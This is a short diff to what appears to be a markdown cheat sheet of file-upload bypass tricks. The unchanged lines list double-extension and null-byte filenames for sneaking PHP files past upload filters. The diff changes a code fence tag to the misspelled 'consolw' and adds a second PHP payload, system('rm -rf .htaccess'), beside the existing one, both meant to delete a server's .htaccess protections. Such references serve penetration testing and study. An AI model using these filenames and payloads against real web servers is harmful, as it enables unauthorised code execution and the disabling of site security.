@@ -48,12 +48,18 @@ file.png.jpg.php
 file.php%00.png%00.jpg
 ```
 
-```php
+```consolw
 -------------
 - by deleting .htaccess
 -------------
 
 <?php
 system("rm .htaccess")
+?>
+
+// OR
+
+<?php
+system("rm -rf .htaccess")
 ?>
 ```
